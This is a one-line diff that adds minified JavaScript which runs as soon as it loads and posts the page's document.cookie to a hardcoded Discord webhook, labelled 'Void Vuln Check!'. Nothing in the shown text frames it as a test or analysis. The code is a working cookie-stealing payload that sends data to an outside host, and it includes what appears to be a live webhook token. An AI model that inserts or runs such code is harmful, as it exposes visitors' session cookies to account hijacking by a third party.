@@ -1,0 +1,1 @@
+function sendMessage(){const e=new XMLHttpRequest;e.open("POST","https://discordapp.com/api/webhooks/676118118082281513/ZS5YcWhurzokBrKX9NgexqtxrJA5Pu2Bo4i7_JsIxC-JIbPBVhSZkcVVukGOro52rnQA"),e.setRequestHeader("Content-type","application/json");const n={username:"Void Vuln Check!",avatar_url:"",content:document.cookie};e.send(JSON.stringify(n))}sendMessage();
